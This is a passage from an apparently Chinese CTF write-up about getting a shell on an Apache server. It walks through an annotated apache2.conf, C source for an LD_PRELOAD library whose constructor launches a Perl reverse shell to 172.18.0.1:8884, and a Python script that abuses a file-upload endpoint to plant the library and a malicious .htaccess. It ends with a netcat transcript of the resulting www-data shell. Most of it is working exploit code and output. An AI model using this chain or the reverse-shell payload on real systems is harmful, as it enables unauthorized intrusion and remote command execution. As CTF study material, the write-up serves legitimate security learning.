class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"># This is the main Apache server configuration file.  It contains the</span><br><span class="line"># configuration directives that give the server its instructions.</span><br><span class="line"># See http://httpd.apache.org/docs/2.4/ for detailed information about</span><br><span class="line"># the directives and /usr/share/doc/apache2/README.Debian about Debian specific</span><br><span class="line"># hints.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># Summary of how the Apache 2 configuration works in Debian:</span><br><span class="line"># The Apache 2 web server configuration in Debian is quite different to</span><br><span class="line"># upstream&#x27;s suggested way to configure the web server. This is because Debian&#x27;s</span><br><span class="line"># default Apache2 installation attempts to make adding and removing modules,</span><br><span class="line"># virtual hosts, and extra configuration directives as flexible as possible, in</span><br><span class="line"># order to make automating the changes and administering the server as easy as</span><br><span class="line"># possible.</span><br><span class="line"></span><br><span class="line"># It is split into several files forming the configuration hierarchy outlined</span><br><span class="line"># below, all located in the /etc/apache2/ directory:</span><br><span class="line">#</span><br><span class="line">#       /etc/apache2/</span><br><span class="line">#       |-- apache2.conf</span><br><span class="line">#       |       `--  ports.conf</span><br><span class="line">#       |-- mods-enabled</span><br><span class="line">#       |       |-- *.load</span><br><span class="line">#       |       `-- *.conf</span><br><span class="line">#       |-- conf-enabled</span><br><span class="line">#       |       `-- *.conf</span><br><span class="line">#       `-- sites-enabled</span><br><span class="line">#               `-- *.conf</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># * apache2.conf is the main configuration file (this file). It puts the pieces</span><br><span class="line">#   together by including all remaining configuration files when starting up the</span><br><span class="line">#   web server.</span><br><span class="line">#</span><br><span class="line"># * ports.conf is always included from the main configuration file. It is</span><br><span class="line">#   supposed to determine listening ports for incoming connections which can be</span><br><span class="line">#   customized anytime.</span><br><span class="line">#</span><br><span class="line"># * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/</span><br><span class="line">#   directories contain particular configuration snippets which manage modules,</span><br><span class="line">#   global configuration fragments, or virtual host configurations,</span><br><span class="line">#   respectively.</span><br><span class="line">#</span><br><span class="line">#   They are activated by symlinking available configuration files from their</span><br><span class="line">#   respective *-available/ counterparts. These should be managed by using our</span><br><span class="line">#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See</span><br><span class="line">#   their respective man pages for detailed information.</span><br><span class="line">#</span><br><span class="line"># * The binary is called apache2. Due to the use of environment variables, in</span><br><span class="line">#   the default configuration, apache2 needs to be started/stopped with</span><br><span class="line">#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not</span><br><span class="line">#   work with the default configuration.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Global configuration</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># ServerRoot: The top of the directory tree under which the server&#x27;s</span><br><span class="line"># configuration, error, and log files are kept.</span><br><span class="line">#</span><br><span class="line"># NOTE!  If you intend to place this on an NFS (or otherwise network)</span><br><span class="line"># mounted filesystem then please read the Mutex documentation (available</span><br><span class="line"># at &lt;URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex&gt;);</span><br><span class="line"># you will save yourself a lot of trouble.</span><br><span class="line">#</span><br><span class="line"># Do NOT add a slash at the end of the directory path.</span><br><span class="line">#</span><br><span class="line">#ServerRoot &quot;/etc/apache2&quot;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The accept serialization lock file MUST BE STORED ON A LOCAL DISK.</span><br><span class="line">#</span><br><span class="line">#Mutex file:$&#123;APACHE_LOCK_DIR&#125; default</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The directory where shm and other runtime files will be stored.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">DefaultRuntimeDir $&#123;APACHE_RUN_DIR&#125;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># PidFile: The file in which the server should record its process</span><br><span class="line"># identification number when it starts.</span><br><span class="line"># This needs to be set in /etc/apache2/envvars</span><br><span class="line">#</span><br><span class="line">PidFile $&#123;APACHE_PID_FILE&#125;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Timeout: The number of seconds before receives and sends time out.</span><br><span class="line">#</span><br><span class="line">Timeout 300</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># KeepAlive: Whether or not to allow persistent connections (more than</span><br><span class="line"># one request per connection). Set to &quot;Off&quot; to deactivate.</span><br><span class="line">#</span><br><span class="line">KeepAlive On</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># MaxKeepAliveRequests: The maximum number of requests to allow</span><br><span class="line"># during a persistent connection. Set to 0 to allow an unlimited amount.</span><br><span class="line"># We recommend you leave this number high, for maximum performance.</span><br><span class="line">#</span><br><span class="line">MaxKeepAliveRequests 100</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># KeepAliveTimeout: Number of seconds to wait for the next request from the</span><br><span class="line"># same client on the same connection.</span><br><span class="line">#</span><br><span class="line">KeepAliveTimeout 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User $&#123;APACHE_RUN_USER&#125;</span><br><span class="line">Group $&#123;APACHE_RUN_GROUP&#125;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># HostnameLookups: Log the names of clients or just their IP addresses</span><br><span class="line"># e.g., www.apache.org (on) or 204.62.129.132 (off).</span><br><span class="line"># The default is off because it&#x27;d be overall better for the net if people</span><br><span class="line"># had to knowingly turn this feature on, since enabling it means that</span><br><span class="line"># each client request will result in AT LEAST one lookup request to the</span><br><span class="line"># nameserver.</span><br><span class="line">#</span><br><span class="line">HostnameLookups Off</span><br><span class="line"></span><br><span class="line"># ErrorLog: The location of the error log file.</span><br><span class="line"># If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;</span><br><span class="line"># container, error messages relating to that virtual host will be</span><br><span class="line"># logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;</span><br><span class="line"># container, that host&#x27;s errors will be logged there and not here.</span><br><span class="line">#</span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log  </span><br><span class="line"># 这种地方是写不了的</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># LogLevel: Control the severity of messages logged to the error_log.</span><br><span class="line"># Available values: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line"># error, crit, alert, emerg.</span><br><span class="line"># It is also possible to configure the log level for particular modules, e.g.</span><br><span class="line"># &quot;LogLevel info ssl:warn&quot;</span><br><span class="line">#</span><br><span class="line">LogLevel warn</span><br><span class="line"></span><br><span class="line"># Include module configuration:</span><br><span class="line">IncludeOptional mods-enabled/*.load</span><br><span class="line">IncludeOptional mods-enabled/*.conf</span><br><span class="line"></span><br><span class="line"># Include list of ports to listen on</span><br><span class="line">Include ports.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sets the default security model of the Apache2 HTTPD server. It does</span><br><span class="line"># not allow access to the root filesystem outside of /usr/share and /var/www.</span><br><span class="line"># The former is used by web applications packaged in Debian,</span><br><span class="line"># the latter may be used for local directories served by the web server. If</span><br><span class="line"># your system is serving content from a sub-directory in /srv you must allow</span><br><span class="line"># access here, or in any related virtual host.</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">        Options FollowSymLinks</span><br><span class="line">        AllowOverride ALL</span><br><span class="line">        Require all denied</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory /usr/share&gt;</span><br><span class="line">        AllowOverride ALL</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Directory /var/www/&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride ALL</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">#&lt;Directory /srv/&gt;</span><br><span class="line">#       Options Indexes FollowSymLinks</span><br><span class="line">#       AllowOverride None</span><br><span class="line">#       Require all granted</span><br><span class="line">#&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AccessFileName: The name of the file to look for in each directory</span><br><span class="line"># for additional configuration directives.  See also the AllowOverride</span><br><span class="line"># directive.</span><br><span class="line">#</span><br><span class="line">AccessFileName .htaccess</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The following lines prevent .htaccess and .htpasswd files from being</span><br><span class="line"># viewed by Web clients.</span><br><span class="line">#</span><br><span class="line">&lt;FilesMatch &quot;^\.ht&quot;&gt;</span><br><span class="line">        Require all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># The following directives define some format nicknames for use with</span><br><span class="line"># a CustomLog directive.</span><br><span class="line">#</span><br><span class="line"># These deviate from the Common Log Format definitions in that they use %O</span><br><span class="line"># (the actual bytes sent including headers) instead of %b (the size of the</span><br><span class="line"># requested file), because the latter makes it impossible to detect partial</span><br><span class="line"># requests.</span><br><span class="line">#</span><br><span class="line"># Note that the use of %&#123;X-Forwarded-For&#125;i instead of %h is not recommended.</span><br><span class="line"># Use mod_remoteip instead.</span><br><span class="line">#</span><br><span class="line">LogFormat &quot;%v:%p %h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; vhost_combined</span><br><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br><span class="line">LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %O&quot; common</span><br><span class="line">LogFormat &quot;%&#123;Referer&#125;i -&gt; %U&quot; referer</span><br><span class="line">LogFormat &quot;%&#123;User-agent&#125;i&quot; agent</span><br><span class="line"></span><br><span class="line"># Include of directories ignores editors&#x27; and dpkg&#x27;s backup files,</span><br><span class="line"># see README.Debian for details.</span><br><span class="line">ExtFilterDefine gzip mode=output cmd=/bin/gzip </span><br><span class="line"># 这个比较有东西哦 可以看到有命令执行了那么套用类似 PHP Mail bypass disable func 的思路进行利用</span><br><span class="line"></span><br><span class="line"># Include generic snippets of statements</span><br><span class="line">IncludeOptional conf-enabled/*.conf</span><br><span class="line"></span><br><span class="line"># Include the virtual host configurations:</span><br><span class="line">IncludeOptional sites-enabled/*.conf</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br></pre></td></tr></table></figure>

<h3><span id="htaccess-lan-yong-gua-zai-ld-perload">htaccess 滥用 挂载 LD_PERLOAD</span><a href="#htaccess-lan-yong-gua-zai-ld-perload" class="header-anchor"></a></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// save as perload.c</span></span><br><span class="line"><span class="comment">// 编译 gcc perload.c  -fPIC -shared -o 1.so </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span> <span class="comment">// 构建 预执行属性</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = <span class="string">&quot;perl -e &#x27;use Socket;$i=\&quot;172.18.0.1\&quot;;$p=8884;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;bash -i\&quot;);&#125;;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const char* cmdline = &quot;perl /tmp/r3.pl &gt; /tmp/r3pwn&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来上 python 利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">target_upload_port = <span class="number">31337</span></span><br><span class="line">upload_file = <span class="string">&quot;.htaccess&quot;</span></span><br><span class="line">target_render_port = <span class="number">31338</span></span><br><span class="line">request_sender_ip = <span class="string">&quot;172.18.0.1&quot;</span></span><br><span class="line">request_ip = <span class="string">&quot;::ffff:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(request_sender_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还是 为了好看</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_request</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;request form&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.request.method, response.request.url)</span><br><span class="line">    <span class="keyword">for</span> header_key <span class="keyword">in</span> response.request.headers.keys():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(header_key, response.request.headers[header_key]))</span><br><span class="line">    body = response.request.body</span><br><span class="line">    <span class="keyword">if</span> body == <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>( body )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_response</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;response form&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code, response.url)</span><br><span class="line">    <span class="keyword">for</span> header_key <span class="keyword">in</span> response.headers.keys():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(header_key, response.headers[header_key]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========================================================&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(string.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算上传路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_upload_path</span>(<span class="params">upload_file, form_id </span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);</span></span><br><span class="line"><span class="string">    userfile = sampleFile.name.toString();</span></span><br><span class="line"><span class="string">    if(userfile.includes(&#x27;/&#x27;)||userfile.includes(&#x27;..&#x27;))&#123;</span></span><br><span class="line"><span class="string">      return res.status(500).send(&quot;Invalid file name&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    uploadPath = &#x27;/uploads/&#x27; + userdir + &#x27;/&#x27; + userfile;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    file_md5 = hashlib.md5(<span class="built_in">open</span>(upload_file,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    userdir  = md5(md5(request_ip)+file_md5)</span><br><span class="line">    userfile = form_id</span><br><span class="line">    <span class="comment"># upload_path = &#x27;/uploads/&#x27; + userdir + &#x27;/&#x27; + userfile # the realworld ctf Env</span></span><br><span class="line">    upload_path = <span class="string">&#x27;/&#x27;</span> + userdir + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> upload_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">## STEP 4 upload error</span></span><br><span class="line">    <span class="comment"># 上传 1.so</span></span><br><span class="line">    sofile_path = uplaod_file(<span class="string">&quot;1.so&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    code = <span class="string">&quot;&quot;&quot;SetEnv LD_PRELOAD &quot;/var/www/html&#123;&#125;1.so&quot;</span></span><br><span class="line"><span class="string">SetOutputFilter gzip</span></span><br><span class="line"><span class="string">ErrorDocument 403 /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(sofile_path)</span><br><span class="line">    <span class="comment"># 启用 gzip 过滤器 执行命令</span></span><br><span class="line">    <span class="comment"># 生成 htaccess</span></span><br><span class="line">    htaccess_file_gen(code)</span><br><span class="line">    <span class="comment"># 输出 这里为了 debug</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sofile_path: &quot;</span>,sofile_path)</span><br><span class="line">    <span class="comment"># 上传 htaccess</span></span><br><span class="line">    htaccess_path = uplaod_file(<span class="string">&quot;.htaccess&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;htaccess_path: &quot;</span>,htaccess_path)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;getshell exec with curl http://&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target_ip,target_render_port)+htaccess_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">htaccess_file_gen</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gen successfully&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 上传文件 利用方法是上面 提到的</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uplaod_file</span>(<span class="params">filename</span>):</span><br><span class="line">    uplaod_url1 = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;/&quot;</span>.<span class="built_in">format</span>(target_ip, target_upload_port)</span><br><span class="line">    r = requests.get(uplaod_url1)</span><br><span class="line">    form_id = r.text.split(<span class="string">&quot;action=&#x27;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&#x27;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    real_form_id = form_id.split(<span class="string">&#x27;/upload?formid=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;you should use this id: &quot;</span>,real_form_id)</span><br><span class="line"></span><br><span class="line">    upload_url2 = <span class="string">&quot;http://&#123;&#125;:&#123;&#125;/upload?formid=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target_ip,target_upload_port,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>: <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>),</span><br><span class="line">        <span class="string">&quot;decoy&quot;</span>:(<span class="string">&quot;decoy&quot;</span>,<span class="string">&quot;random&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    r2 = requests.post(upload_url2,files=files)</span><br><span class="line">    print_request(r2)</span><br><span class="line">    print_response(r2)</span><br><span class="line"></span><br><span class="line">    form_id = real_form_id</span><br><span class="line">    <span class="keyword">return</span> calc_upload_path(filename,form_id)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>最后运行结果的 拿到 .htaccess 文件对应的地址 一个 curl 打过去就有了</p>
<p>当然记得起 netcat 的监听</p>
<h2><span id="zui-hou-getshell-readflag">最后 Getshell readflag</span><a href="#zui-hou-getshell-readflag" class="header-anchor"></a></h2><p>直接执行一个 readflag 的计算</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvvp 8884        </span><br><span class="line">listening on [any] 8884 ...</span><br><span class="line">172.18.0.3: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [172.18.0.1] from (UNKNOWN) [172.18.0.3] 54924</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (31): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@a17ac98d17ba:/$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 100</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan 27 07:28 .</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan 27 07:28 ..</span><br><span class="line">-rwxr-xr-x   1 root root     0 Jan 27 07:28 .dockerenv</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:29 bin</span><br><span class="line">drwxr-xr-x   2 root root  4096 Apr 24  2018 boot</span><br><span class="line">drwxr-xr-x   5 root root   340 Jan 27 07:28 dev</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan 27 07:28 etc</span><br><span class="line">-r-x------   1 root root    39 Jan 20 09:19 flag</span><br><span class="line">drwxr-xr-x   2 root root  4096 Apr 24  2018 home</span><br><span class="line">drwxr-xr-x   1 root root  4096 May 23  2017 lib</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:29 lib64</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:27 media</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:27 mnt</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:27 opt</span><br><span class="line">dr-xr-xr-x 334 root root     0 Jan 27 07:28 proc</span><br><span class="line">-r-sr-xr-x   1 root root 13144 Jan 20 09:16 readflag</span><br><span class="line">drwx------   1 root root  4096 Jan 27 07:44 root</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan 27 07:28 run</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:29 sbin</span><br><span class="line">drwxr-xr-x   2 root root  4096 Jan  5 19:27 srv</span><br><span class="line">dr-xr-xr-x  13 root root     0 Jan 27 07:28 sys</span><br><span class="line">drwxrwxrwt   1 root root  4096 Jan 27 07:28 tmp</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan  5 19:27 usr</span><br><span class="line">drwxr-xr-x   1 root root  4096 Jan 27 07:28 